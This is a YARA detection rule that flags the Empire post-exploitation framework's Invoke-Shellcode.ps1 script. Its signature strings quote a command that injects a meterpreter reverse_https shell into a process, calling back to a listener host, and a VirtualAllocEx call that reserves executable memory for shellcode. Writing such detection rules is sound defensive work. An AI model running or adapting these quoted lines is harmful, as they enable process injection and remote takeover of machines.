rule Empire_Invoke_Shellcode_RID3030 : DEMO SCRIPT SUSP T1059_001 {
   meta:
      description = "Empire - a pure PowerShell post-exploitation agent - file Invoke-Shellcode.ps1"
      author = "Florian Roth"
      reference = "https://github.com/PowerShellEmpire/Empire"
      date = "2015-08-06 12:29:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, SUSP, T1059_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "C:\\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbos" ascii
      $s2 = "\"Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!\" ) )" fullword ascii
      $s3 = "$RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)" fullword ascii
   condition: 
      filesize < 100KB and 1 of them
}